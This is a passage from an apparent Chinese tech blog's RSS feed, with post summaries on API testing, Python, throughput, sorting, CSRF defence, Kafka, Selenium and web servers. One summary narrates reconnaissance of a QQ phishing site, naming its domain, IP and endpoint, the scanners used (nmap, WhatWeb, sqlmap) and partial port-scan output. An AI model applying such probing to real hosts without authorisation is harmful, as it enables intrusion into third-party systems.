解决 此时需要修改 Nginx 的 server 配置内容，增加字段：charset utf-8;
upstream you.example.com { server 127.0.0.1:8081; } server { listen 80; server_name you.example.com; charset utf-8; location /examples { return 403; } ...... } </description>
    </item>
    
    <item>
      <title>随记(7)——为什么要做接口测试</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B07%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%81%9A%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/</link>
      <pubDate>Wed, 16 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B07%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%81%9A%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/</guid>
      <description>1.怎么理解接口 举个例子，假如我们在开发1个bug管理系统，该系统需要拿到公司的所有开发和测试人员的信息，这样开发和测试人员不用注册都可以登录进去了，这应该很好理解。
那么这些人员的信息储存在哪里呢？一般存储在hr系统里。现在的需求更加明确了，我们要到hr系统中去拿到人员信息，获取hr系统中的人员资源。
直接把hr系统的数据库拷贝一份放到bug管理系统里，不过这样不好，因为数据的同步会有点麻烦；还可以直接连hr系统的数据库去查，这样也不太好，这样我们就需要了解hr系统的数据存储结构和逻辑，一旦hr系统的数据字段发生改变，bug管理系统也要去改，以便同步。
比较好的做法是，hr系统暴露一些接口，通过这些接口去获取人员信息资源，这样bug系统就不需要关心hr系统的数据存储实现。
这些接口可能是这样的：
 登录的接口，提供人员的用户名和密码，去hr系统中判断该人员是否存在，如果存在，验证用户名和密码，如果验证通过就返回1个token，该token就是这个人员的通行证，通过token可以登录到bug管理系统中去； 获取人员信息的接口，返回该人员的职位：测试还是开发，以及用户名，昵称等信息；  综上：接口是不同系统或模块之间资源交流的工具
2.接口测试实际上是黑盒测试 作为黑盒测试，基本的测试思路是通过输入和输出判断被测系统或者对象的逻辑。
获取人员的信息，我需要把人员的用户名传给hr系统接口，这样hr系统的接口会返回给我用户的一些更加具体的信息。这里的输入是用户名，输出是用户的详细信息。
3.为什么要做接口测试 大部分系统和产品中，资源一般都是产品的核心，比如微信核心资源就是通讯录关系链和聊天记录等，因此资源是必测的。接口是不同系统或模块之间操作资源方式，所以接口测试是必要的
另外接口中大部分的内容是数据，通过数据的对比我们能推测到系统和产品的逻辑，测接口就是测逻辑。
最后接口中的返回相对单纯，不像web页面，html代码中有太多UI的东西，UI最不稳定，变化太快，接口相对稳定一点点，但是里面的干扰信息更少，断言相对容易很多。
接口测试用例怎么写，建议遵循3A原则。
 Arrange: 测试用例执行之前需要准备测试数据，包括需要输入的数据及存量数据 Act: 通过不同的参数来调用接口，并拿到返回 Assert: 必须做断言，否则用例就没有任何意义了  4.什么是Mock Server 前端和后端往往节奏是不一致的。前端很多情况下需要等待后台的API开发完成后才能进行开发联调和测试，这种前后端不对称就造成了前后端团队节奏不一致，从而造成整个项目/产品交付/发布延期。
有一种解决方案的思路是前后端先约定好后端提供的API接口的细节，前端人员自行先模拟出这些后端的实现，当然这些实现是假的，不过前端可以去调用这些假的实现，而且能拿到返回，这样一来前端就不需要等待后端开发完成才开始工作了。
但是这样还是会有问题，前端实现的假的API没办法迅速反映出后端的变化。简单来说就是后端可能在约定好的API接口上进行了些许修改，而没有知会前端人员，这样前端的假的API实现并没有相应更新，在正式联调时就会出现问题。
像这种假的API实现，不管是前端实现的还是后端去实现的，我们可以称之为mock server
 mock表示这个API返回的数据是假的，仅作为测试用的 server表示需要启动服务，说到底这是一个服务程序  5.契约测试 由于前后端往往有一些信息不对称，导致约定的API可能在前后端都会发生变化，所以保证前后端的一致性就成了一个挑战。这时候就有人提出了契约测试，大致思想是前后端共用一份契约，约定了API的细节，前后端的任何变化都需要先修改契约，然后通过契约去通知前后端团队，统一更新实现。这也是契约精神的表现。</description>
    </item>
    
    <item>
      <title>Python(2)——程序的入口</title>
      <link>https://ac-lm.github.io/posts/python/python2%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%85%A5%E5%8F%A3/</link>
      <pubDate>Tue, 15 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python2%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%85%A5%E5%8F%A3/</guid>
      <description>1.前言 我们都知道 C 或者 Java 程序运行必然有主程序入口 main 函数，而 python 却不同，即便没有主程序入口，程序一样可以自上而下对代码块依次运行，如果要实现 C 那样的主程序入口 main 函数，我们可以使用以下的判断
if __name__==&#39;__main__&#39;:2.语义解释 __name__是 python 的内置属性，属于系统全局变量，每一个 py 文件都有一个属于自己的__name__
 如果 py 文件作为模块被导入(import)，那么__name__就是该 py 文件的文件名(也称模块名) 如果 py 文件直接运行时，那么__name__默认等于字符串 main  也就是当一个 py 文件作为启动文件时，该文件的内置属性__name__等于__main__，而作为导入模块时，该模块的__name__等于文件名(也称模块名字)，我们对__name__进行判断，就可以仅执行启动文件的程序，而不会执行导入模块的程序(函数与类除外，这类归于调用)
3.作用  作为启动 py 文件的 main 函数入口 一个项目中必然会包含多个模块文件，每个模块文件在写完代码之后会做一些简单的测试用于检测 bug 或者对自己的函数调用写一个简单的示例，而恰到好处的是，编写这样一个入口函数既不会影响你测试代码，也不会影响别人调用你的接口函数，一举多得  </description>
    </item>
    
    <item>
      <title>随记(6)——渗透的思路</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B06%E6%B8%97%E9%80%8F%E7%9A%84%E6%80%9D%E8%B7%AF/</link>
      <pubDate>Tue, 15 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B06%E6%B8%97%E9%80%8F%E7%9A%84%E6%80%9D%E8%B7%AF/</guid>
      <description>原文参考：@Tsing 
 使用到的工具 nmap WhatWeb w3af sqlmap
一次渗透的过程 首先这里有一个伪造的LOL站点 uvu.cc/ixMJ ，这是一个经过缩短链接处理的网站，打开后跳转到真实网址 mfspfgp.top ，其页面如图：
在点击登录后，弹出一个对话框，让输入QQ号和密码，实现盗号操作
打开浏览器的开发者工具，查看网站的 POST 过程。找到其 POST 的地址 mfspfgp.top/lollove.php ，参数只有两个：name 和 pass
下面来看看能不能挖掘些其他的东西，首先PING一下域名 mfspfgp.top ，得到服务器的 IP 地址（103.98.114.75）
然后查一下IP，发现是个香港的服务器
之后查一下IP的 whois 信息，得到一个 QQ 邮箱和一个手机号，当然这两个联系方式也不一定是真的。
然后，利用邮箱反查工具，查一下这个邮箱还注册了哪些网站，结果找出 9 个，发现其中有 6 个可以正常访问。
对应三种形式的诈骗网页，分别是刚才展示的【生日祝福】、【酷秀一夏】、【2017赛事正式开始】，后两个页面截图分别如下
最后，将上面提到的网址全部 Ping 了一下，获取了全部的 IP 地址
我们选择其中物理位置最详细的那个 IP 来尝试渗透
首先在 WhatWeb 里面检索一下这个 IP 地址，即可知道这个网站采用的是nginx 1.8.1服务器，使用的是5.5.38版本的 PHP
然后用 nmap 扫了一下端口和运行的服务，发现开放的端口还是蛮多的
PORT STATE SERVICE1/tcp open tcpmux3/tcp open compressnet4/tcp open unknown6/tcp open unknown7/tcp open echo9/tcp open discard.</description>
    </item>
    
    <item>
      <title>随记(5)——什么是接口</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B05%E4%BB%80%E4%B9%88%E6%98%AF%E6%8E%A5%E5%8F%A3/</link>
      <pubDate>Mon, 14 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B05%E4%BB%80%E4%B9%88%E6%98%AF%E6%8E%A5%E5%8F%A3/</guid>
      <description>参考原文：接口测试总结 @猴子请来的救兵 
 1.什么是接口 我们先来看一张图，从这张图来了解什么是接口。
如图中 A 线，A 线指向一个电灯的开关，这个电灯的开关就可以称为接口。它有两个状态——开和关，我们可以通过选择不同的参数来实现电灯的开关。
实际我们知道电灯的开关其实是通过零线、火线来操控的，而接口呢，其实就是把这些复杂的操作简化了，让你看到的只有一个开关。而我们做接口测试也只需要测试这个开关就可以完成任务。
 当你访问 http://127.0.0.1:8080/light?opt=open ，让零线、火线连通，此时灯亮。 当你访问 http://127.0.0.1:8080/light?opt=close ，让零线、火线断开，此时灯灭。  2.接口的结构 一个URL就是一个接口，接下来需要理解一下HTTP的URL是怎么组成为一个接口的，如图：
 请求协议：如 http — 普通的http请求，https — 加密的http请求，ftp — 文件传输协议 请求IP：提供接口的系统所部署的服务器地址 请求端口：如果不填端口，默认是80，否则需要填写端口号 接口路径：指系统提供的接口在什么位置 接口参数：参数在接口路径后，用“?”来表示路径地址完了，剩下的都是参数了，用“&amp;amp;”来区分参数个数 参数值： 接口参数的值  3.接口的HTTP参数【隐藏参数】 http请求方式  GET --- 通过请求URI得到资源POST --- 用于添加新的内容PUT --- 用于修改某个内容DELETE --- 删除某个内容CONNECT --- 用于代理进行传输，如使用SSLOPTIONS --- 询问可以执行哪些方法PATCH --- 部分文档更改PROPFIND (wedav) --- 查看属性PROPPATCH (wedav) --- 设置属性MKCOL (wedav) --- 创建集合（文件夹）COPY (wedav) --- 拷贝MOVE (wedav) --- 移动LOCK (wedav) --- 加锁UNLOCK (wedav) --- 解锁TRACE --- 用于远程诊断服务器HEAD --- 类似于GET, 但是不返回body信息，用于检查对象是否存在，以及得到对象的元数据http请求头 请求头包含许多有关的客户端环境和请求正文的有用信息。例如，请求头可以声明浏览器所用的语言，请求正文的长度</description>
    </item>
    
    <item>
      <title>随记(4)——如何提高吞吐量</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B04%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98%E5%90%9E%E5%90%90%E9%87%8F/</link>
      <pubDate>Sun, 13 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B04%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98%E5%90%9E%E5%90%90%E9%87%8F/</guid>
      <description>1.服务器（进程）级别 服务器级别增加网站吞吐量是诸多措施中最容易并且是效果最好的，如果一个网站能通过增加少量的服务器来提高吞吐量，应该优先采用。毕竟一台服务器的费用相比较一个程序员费用来说要低的多。但是有一个前提，就是你的服务器是系统的瓶颈，网站系统之后的其他系统并非瓶颈。如果你的系统的瓶颈在接口或者其他服务，盲目的增加服务器并不能解决你的问题。
通过增加服务器来解决你的网站瓶颈，意味着你的网站需要做负载均衡。负载均衡(Load Balance)，其含义就是指将负载（工作任务）进行平衡、分摊到多个操作单元上进行运行，例如FTP服务器、Web服务器、企业核心应用服务器和其它主要任务服务器等，从而协同完成工作任务。负载均衡的方案，比如 LVS、Nginx、F5 等
2.线程级别 当一个请求到达服务器并且正确的被服务器接收之后，最终执行这个请求的载体是一个线程。当一个线程被CPU载入执行其指令的时候，在同步的状态下，当前线程会阻塞在那里等待CPU结果，如果CPU执行的是比较慢的IO操作，线程会一直被阻塞闲置很长时间，这里的很长是对比CPU的速度而言。当一个新的请求到来的时候，如果没有新的线程去领取这个任务并执行，要么会发生异常，要么创建新的线程。
线程是一种很稀缺的资源，不可能无限制的创建。这种情况下我们就要把线程这种资源充分利用起来，不要让线程停下来。这也是程序推荐采用异步的原因。试想，一个线程不停的在工作，遇到比较慢的IO不会去等待结果，而是接着处理下一个请求，当IO的结果返回来得到通知的时候，线程再去取IO结果，岂不是能在相同时间内处理更多的请求。程序异步化（非阻塞）会明显提高系统的吞吐量，但是响应时间可能会稍微变大。
还有一点，尽量减少线程上下文在CPU的切换，因为线程上线文切换的成本也是比较大的，在线程切换的时候，CPU需要把当前线程的上下文信息记录下来用以下次调用的时候使用，然后把新线程的上下文信息载入然后执行。这个过程相对于CPU的执行速度而言，要慢很多。
3.CPU级别 现代操作系统都采用虚拟寻址的方式，它的寻址空间（虚拟存储空间）为4G（2的32次方）。操作系统将虚拟空间分为两类：内核空间和用户空间。
 内核空间独立于用户空间，有访问受保护的内存空间、IO设备的权限（所有的用户空间共享）。 用户空间就是我们的应用程序运行的空间，其实用户空间并没有操作各种IO设备的权限，像我们平时读取一个文件，本质上是委托内核空间去执行读取指令的，内核空间读取到数据之后再把数据复制到程序运行的空间，最后应用程序再把数据返回调用方。  内核会为每个I/O设备维护一个 buffer（同一个文件描述符读和写的buffer不同），应用程序发出一个IO操作的指令其实通过了内核空间和用户空间两个部分，并且发生了数据的复制操作。这个过程其实主要包含两个步骤：用户进程发出操作指令并等待数据；内核把数据返回给用户进程（buffer的复制操作）。根据这两个操作的不同表现，所以IO模型有了同步阻塞，同步非阻塞，异步阻塞，异步非阻塞的概念。利用CPU提高系统吞吐量主要目标是提高单位时间内CPU运行的指令数，避免CPU做一些无用功。可以通过增加CPU的个数来增加吞吐量
CPU负责把buffer的数据copy到应用程序空间，应用程序再把数据返回给调用方，假如这个过程发生的是一次Socket操作，应用程序在得到 IO 返回数据之后，还需要网卡把数据返回给client端，这个过程又需要把刚刚得到的buffer数据再次通过内核发送至网卡，通过网络传送出去。由此可见CPU把buffer数据copy到应用程序空间这个过程完全没有必要，在内核空间完全可以把buffer数据直接传输至网卡，这也是零拷贝技术要解决的问题。
PS：零复制 (Zero-copy) 技术是指计算机执行操作时，CPU不需要先将数据从某处内存复制到另一个特定区域。这种技术通常用于通过网络传输文件时节省CPU周期和内存带宽。
4.网络传输级别 由于协议大部分是TCP/IP，所以在协议传输方面优化的手段比较少，但是应用程序级别协议可以选择压缩率更好的，比如采用GRPC会比单纯的HTTP协议要好很多，HTTP2 要比HTTP 1要好很多。
另外一方面网卡尽量加大传输速率，比如千兆网卡要比百兆网卡速度更快。由于网络传输比较偏底层，所以人工干预的切入点会少很多。
5.代码层  加大应用的进程数，增加并发数，特别在进程数是瓶颈的情况下； 优化线程调用，尽量线程池化； 应用的代码异步化，特别是异步非阻塞式编程对于提高吞吐量效果特别明显； 充分利用多核CPU优势，实现并行编程； 减少每个调用的响应时间，缩短调用链，例如通过加索引的方式来减少访问一次数据库的时间；  </description>
    </item>
    
    <item>
      <title>随记(3)——排序算法</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B03%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</link>
      <pubDate>Sat, 12 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B03%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</guid>
      <description>参考原文：常见排序算法 @zwtgyh 
 1.冒泡排序 原理解析 选择第 1 个和第 2 个数字，如果第 1 个大于第 2 个，则二者交换位置（假设是升序排列）。之后选择第 2个和第 3 个数字，类似交换处理。一轮下来后，最大的数字会冒泡到最后一位。接下来，忽略已经排好的数字，对于剩下的数字再来一轮，直到所有的数字都排列完成。
复杂度分析 若文件的初始状态是正序的，一趟扫描即可完成排序。所需的关键字比较次数 C 和记录移动次数 M 均达到最小值：Cmin = n-1，Mmin = 0，所以，冒泡排序最优的时间复杂度为 O(n)
若初始文件是反序的，需要进行 n-1趟排序。每趟排序要进行 n-1 次关键字的比较( 1 ≤ i ≤ n-1 )，且每次比较都必须移动记录三次来达到交换记录位置。在这种情况下，比较和移动次数均达到最大值：Cmax=n(n-1)/2，Mmax=3n(n-1)/2，冒泡排序的最坏时间复杂度为O(n^2)
 平均的时间复杂度为：O(n^2) 最优的空间复杂度，不需要借用第三方内存空间，则复杂度为0 最差的空间复杂度，每次都要借用一次内存，按照实际的循环次数，为O(N) 平均的空间负杂度为：O(1)  2.插入排序 原理解析  从第一个元素开始，该元素可以认为已经被排序 取出下一个元素，在已经排序的元素序列中从后向前扫描 把取出的元素放到已排序的元素中间的合适位置 重复步骤2~3 就像排队一样，依次每次挑一个同学，把该同学插入到已经排好的部分队伍里。  复杂度分析  最优的情况，当待排序数组是有序时，只需当前数跟前一个数比较一下就可以了，这时一共需要比较N-1次，时间复杂度为 O(N) 。 最坏的情况，当待排序数组是逆序的，此时需要比较次数最多，总次数记为：1+2+3+…+N-1，所以，插入排序最坏情况下的时间复杂度为O(N^2) 。 平均来说，A[1..j-1] 中的一半元素小于 A[j]，一半元素大于 A[j]。插入排序在平均情况运行时间与最坏情况运行时间一样，是输入规模的二次函数。 插入排序的空间复杂度为常数阶O(1)  3.快速排序 原理解析 快速排序使用分治法策略来把一个序列分为两个子序列。其步骤为：</description>
    </item>
    
    <item>
      <title>随记(2)——什么是CSRF</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B02%E4%BB%80%E4%B9%88%E6%98%AF-csrf/</link>
      <pubDate>Fri, 11 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B02%E4%BB%80%E4%B9%88%E6%98%AF-csrf/</guid>
      <description> 参考原文：CSRF 是什么？@饥人谷若愚 
 1.什么是 CSRF 跨站请求伪造 CSRF (Cross Site Request Forgery)攻击，中文名：跨站请求伪造。其原理是攻击者构造网站后台某个功能接口的请求地址，诱导用户去点击或者用特殊方法让该请求地址自动加载。这样，当用户在登录状态下请求这个地址时，服务端就会以为这个非法操作是用户合法的操作。
2.如何避免 在客户端防范方面：对于数据库的修改请求，全部使用 POST 提交，禁止使用 GET 请求。在服务器端防范方面：一般的做法是在表单里面添加一段隐藏的唯一的 token (请求令牌)。比如：
 服务端在收到路由请求时，生成一个随机数，在渲染请求页面时把随机数埋入页面（一般埋入 form 表单内） 服务端设置 setCookie，把该随机数作为 cookie 或者 session 种入用户浏览器 当用户发送 GET 或者 POST 请求时带上 csrf_token 参数（对于 Form 表单直接提交即可，因为会自动把当前表单内所有的 input 提交给后台，包括 csrf_token） 后台在接受到请求后解析请求的 cookie 获取 csrf_token 的值，然后和用户请求提交的 csrf_token 做个比较，如果相等表示请求是合法的 尽量少用 GET。假如攻击者在我们的网站上传了一张图片，用户在加载图片的时候实际上是向攻击者的服务器发送了请求，这个请求会带有 referer 表示当前图片所在的页面的 url。 而如果使用 GET 方式接口的话这个 URL 就形如：https://xxxx.com/gift?giftId=aabbcc&amp;amp;_csrf_token=xxxxx，把 token 接在 URL 后面，那相当于攻击者获取了 csrf_token ，短时间内可以使用这个 token 来操作其他 GET 接口。  </description>
    </item>
    
    <item>
      <title>随记(1)——什么是 Kafka</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B01%E4%BB%80%E4%B9%88%E6%98%AF-kafka/</link>
      <pubDate>Thu, 10 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B01%E4%BB%80%E4%B9%88%E6%98%AF-kafka/</guid>
      <description>参考原文：Kafka 初识 @暮良文王 
 1.什么是 KafKa Kafka（Apache Kafka）是一款开源的消息引擎系统 （Messaging System），根据维基百科的定义：消息引擎系统是一组规范，企业利用这组规范在不同系统之间传递语义准确的消息，实现松耦合的异步式数据传递。简单来说消息引擎的作用就是实现以下的功能
 系统 A 发送消息给消息引擎系统 系统 B 从消息引擎系统中读取 A 发送的消息。  2.Kafka 如何设计信息 Kafka 使用的是纯二进制的字节序列。如果我们在设计消息使用了 CSV、XML 亦或是 JSON 这些结构化的框架，那么在发送给 Kafka 前都要将其转换成二进制的字节序列。
3.Kafka 如何传递消息 Kafka 同时支持两种消息引擎模型，即：
 点对点模型：也叫消息队列模型。即系统 A 发送的消息只能被系统 B 接收，其他任何系统都不能读取 A 发送的消息。日常生活的例子比如电话客服就属于这种模型：同一个客户呼入电话只能被一位客服人员处理，第二个客服人员不能为该客户服务。 发布 / 订阅模型：与上面不同的是，它有一个主题（Topic）的概念，你可以理解成逻辑语义相近的消息容器。该模型也有发送方和接收方，只不过提法不同。发送方也称为发布者（Publisher），接收方称为订阅者（Subscriber）。和点对点模型不同的是，这个模型可能存在多个发布者向相同的主题发送消息，而订阅者也可能存在多个，它们都能接收到相同主题的消息。生活中的报纸订阅就是一种典型的发布 / 订阅模型。　  4.为什们要使用 Kafka 为什么系统 A 不能直接发送消息给系统 B，中间还要隔一个消息引擎呢？为什么要使用 Kafka 呢？
这里的答案是削峰填谷。所谓的削峰填谷就是指缓冲上下游瞬时突发流量，使其更平滑。特别是对于那种发送能力很强的上游系统，如果没有消息引擎的保护，脆弱的下游系统可能会直接被压垮导致全链路服务雪崩。但是，一旦有了消息引擎，它能够有效地对抗上游的流量冲击，真正做到将上游的峰填满到谷中，避免了流量的震荡。消息引擎系统的另一大好处在于发送方和接收方的松耦合，这也在一定程度上简化了应用的开发，减少了系统间不必要的交互。
举个简单例子来说，比如购买课程，每门课程都有一个专门的订阅按钮，点击之后进入到付费页面。这个流程可以简单的看成这样：点击订阅按钮调用订单系统生成对应的订单，这是上游。处理该订单会依次调用多个子系统服务 ，比如调用支付宝和微信支付的接口、查询你的登录信息、验证课程信息等，这是下游。显然上游的生成订单的操作比较简单，它的TPS要远高于处理订单的下游服务，因此如果上下游系统直接对接，势必会出现下游服务无法及时处理上游订单从而造成订单堆积的情形。特别是当出现类似于秒杀这样的业务时，上游订单流量会瞬时增加，可能出现的结果就是直接压跨下游子系统服务。
解决此问题的一个常见做法是我们对上游系统进行限速，但这种做法对上游系统而言显然是不合理的，毕竟问题并不出现在它那里。所以更常见的办法是引入像 Kafka 这样的消息引擎系统来对抗这种上下游系统 TPS 的错配以及瞬时峰值流量。
当引入了 Kafka 之后。上游订单服务不再直接与下游子服务进行交互。当新订单生成后它仅仅是向 Kafka Broker 发送一条订单消息即可。类似地，下游的各个子服务订阅 Kafka 中的对应主题，并实时从该主题的各自分区（Partition）中获取到订单消息进行处理，从而实现了上游订单服务与下游订单处理服务的解耦。这样当出现秒杀业务时，Kafka 能够将瞬时增加的订单流量全部以消息形式保存在对应的主题中，既不影响上游服务的 TPS，同时也给下游子服务留出了充足的时间去消费它们。这就是 Kafka 这类消息引擎系统的最大意义所在。</description>
    </item>
    
    <item>
      <title>Python(1)——Selenium</title>
      <link>https://ac-lm.github.io/posts/python/python1selenium/</link>
      <pubDate>Mon, 22 Jun 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python1selenium/</guid>
      <description>1.什么 Selenium Selenium是一个用于测试网站的自动化测试工具，支持各种浏览器，如Chrome、Firefox、Edge等。
2.安装 pip install Selenium3.使用前提 Selenium的使用是基于浏览器驱动webdriver来启动与操作网页的，因此想要正常的进行Selenium自动化测试就必须获取对应浏览器的webdriver驱动文件。同时在环境变量中配置Path的属性，令其指向放置webdriver驱动文件的文件夹，或在程序中指定webdriver驱动文件的位置
4.Selenium 的定位方法 |元素 | 定位一个元素 | 含义 |-------------------| --------------------------------- | -------------------|id | find_element_by_id | 通过元素id定位 |name | find_element_by_name | 通过元素name定位 |xpath | find_element_by_xpath | 通过xpath表达式定位 |link_texr | find_element_by_link_text | 通过完整超链接定位 |partial_link_text | find_element_by_partial_link_text | 通过部分链接定位 |tag_name | find_element_by_tag_name | 通过标签定位 |class_name | find_element_by_class_name | 通过类名进行定位 |css_selector | find_elements_by_css_selector | 通过css选择器进行定位 对象的定位是自动化测试的核心，要想操作一个对象，首先应该识别这个对象。一个对象就像一个人一样，他会有各种的特征（属性），我们可以通过这个属性找到这对象。以百度搜索的输入框为例，有以下属性（F12查看）
input id=&amp;quot;kw&amp;quot; class=&amp;quot;s_ipt&amp;quot; name=&amp;quot;wd&amp;quot; value=&amp;quot;&amp;quot; maxlength=&amp;quot;255&amp;quot; autocomplete=&amp;quot;off&amp;quot;我们可以这样来定位属性（这里请注意CSS和xpath，本文中不做深入探讨，但是最常用的定位方式）
通过id方式定位：browser.find_element_by_id(&amp;quot;kw&amp;quot;)通过name方式定位：browser.</description>
    </item>
    
    <item>
      <title>Web服务器(3)——动-静态网页</title>
      <link>https://ac-lm.github.io/posts/web/web%E6%9C%8D%E5%8A%A1%E5%99%A83%E5%8A%A8-%E9%9D%99%E6%80%81%E7%BD%91%E9%A1%B5/</link>
      <pubDate>Wed, 04 Mar 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/web/web%E6%9C%8D%E5%8A%A1%E5%99%A83%E5%8A%A8-%E9%9D%99%E6%80%81%E7%BD%91%E9%A1%B5/</guid>
      <description>1.静态网页  在静态Web程序中，客户端使用Web浏览器通过网络使用HTTP协议向服务器发送一个请求（Request），告诉服务器需要得到某个页面，之后WEB服务器根据用户的需要，从文件系统（存放了所有静态页面的磁盘）取出内容返回给客户端，客户端接收到内容之后经过浏览器渲染解析，得到显示的效果。 为了让静态页面显示更加好看，使用 javascript 美化页面，但是这些处理都是在客户端上借助于浏览器展示的，在服务器上并没有任何的变化。 静态页面无法连接数据库； 现今的web页面中，大量使用JS，导致浏览器打开页面，就会占用大量的内存，服务端的压力是减轻了，但压力转移到了客户端。 运行在客户端的程序、网页、插件、组件，属于静态网页，例如：html，javascript等等，他们可以脱离服务器运行于浏览器客户端。 静态网页的内容相对稳定，URL地址相对于动态网页的更加容易被搜索引擎识别,所以网站进行SEO优化的时候一般都是建议采用静态网页。 静态网页无需数据库的支持，所以访问速度上较之动态网页比较快，不过随着浏览器以及宽带速度提升，这种差别会越来越小。  2.动态网页  动态WEB中，程序依然使用客户端和服务端，客户端依然使用浏览器通过HTTP协议发送请求（Request），但现在的所有请求都要先经过一个WEB Server来处理。 如果客户端请求的是静态资源(.html 或者是.htm)，则将请求直接转交给WEB服务器，之后WEB服务器从文件系统中取出内容，发送回客户端浏览器进行解析执行。 如果客户端请求的是动态资源，则先将请求转交给WEB Container(WEB容器)，在WEB Container中连接数据库，从数据库中取出数据并完成一系列操作后，动态拼凑页面的展示内容，最后把所有的展示内容交给WEB服务器返回。 运行在服务器端的程序、网页、组件，属于动态网页，例如：JSP,ASP,PHP等。它们会随不同客户、不同时间，返回不同的网页。  3.静态网页和动态网页区别的简单描述  静态页面中，设计者把页面上所有东西都设定好、做死了，不管是谁在任何时候看到的页面内容都是一样的，一成不变（除非手动修改页面内容）。运行于客户端的程序、网页、插件、组件，属于静态网页，例如html页、Flash、JavaScript、VBScript等等，它们是永远不变的。静态html页面文件，可以直接用本地的浏览器打开。静态页面放到什么地方都能运行的。动态页面则不行。 程序是否在服务器端运行，这个是判断网页属不属于动态网页的重要标志。动态页面是需要服务器解释的。动态页面的内容一般都是依靠服务器端的程序来生成的，不同人、不同时候访问页面，显示的内容都可能不同。网页设计者在写好服务器端的页面程序后，不需要手工控制，页面内容会按照页面程序的安排自动更改变换。在服务器端运行的程序、网页、组件，属于动态网页，它们会随不同客户、不同时间，返回不同的网页，例如ASP、PHP、JSP、ASP.net、CGI等。 动态网页相比静态网页的交互性更高，可以实现更多的功能，如用户注册、登录等一系列用户需要与网站发生互动的功能基本都需要由动态网页来满足。动态网页，与网页上的各种动画、滚动字幕等视觉上的“动态效果”没有直接关系，动态网页也可以是纯文字内容的，也可以是包含各种动画的内容，这些只是网页具体内容的表现形式。 动态网页不是一个独立存在服务器上的网页，当用户发送请求时，服务器可能还要拼凑其他元素才会返回一个完整的网页，而静态网页一旦上传到服务器上，就是实实在在保存在服务器上的网页文件。 html是w3c规范的一种网页书写格式，是一种统一协议语言，静态网页。我们上网看的网页都是大部分都是基于html语言的。jsp是一种基于动态的语言，jsp可以实现html的所有任务， HTML（Hypertext Markup Language）文本标记语言，它是静态页面，和JavaScript一样解释性语言，为什么说是解释性语言？因为，只要你有一个浏览器那么它就可以正常显示出来，而不需要指定的编译工具，只需在TXT文档中写上HTML标记就可以正常显示。JSP（Java Server Page）是Java服务端的页面，所以它是动态的，它是需要经过JDK编译后把内容发给客户端去显示，我们都知道，Java文件编译后会产生一个class文件，最终执行的就是这个class文件， html和jsp的表头不一样，这个是JSP的头&amp;lt;%@ page language=”java” import=”java.util.*” pageEncoding=”gbk”%&amp;gt;在表头中有编码格式和倒入包等。在jsp中用&amp;lt;% %&amp;gt;就可以写Java代码了，而html没有&amp;lt;% %&amp;gt;。 静态网页适合更新较少的网站，一般适用于展示型的网站，而动态网页则更新较多，一般用于用户互动较多的网站。  </description>
    </item>
    
    <item>
      <title>Web服务器(2)——Apache &amp; Tomcat</title>
      <link>https://ac-lm.github.io/posts/web/web%E6%9C%8D%E5%8A%A1%E5%99%A82apache-tomcat/</link>
      <pubDate>Tue, 03 Mar 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/web/web%E6%9C%8D%E5%8A%A1%E5%99%A82apache-tomcat/</guid>
